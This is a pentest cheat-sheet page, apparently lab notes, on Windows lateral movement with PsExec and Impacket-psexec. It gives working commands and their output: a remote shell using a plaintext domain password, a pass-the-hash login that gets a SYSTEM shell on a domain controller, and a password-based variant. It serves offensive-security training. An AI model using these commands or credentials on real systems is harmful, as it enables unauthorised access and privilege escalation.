---
description: PsExec is a very versatile tool that is part of the SysInternals Suite.
---

# PsExec

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" %}



## Prerequisites

In order to use PsExec for lateral movement the following conditions must be met:

* SysInternals Tools Installed on System.
* The user is apart of the Local Administrator group.
* _ADMIN$_ share must be available and File and Printer Sharing has to be turned on.



### Lateral Movement

```powershell
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```



## Impacket-Psexec

We can use Impacket on our Kali host to connect via PsExec.

### Pass The Hash

```shell
kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.6.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240.....
[*] Creating service tahE on 172.16.6.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
```



### Plaintext Password

```shell-session
kali@kali:~$ proxychains -q impacket-psexec beccy@172.16.6.240
```
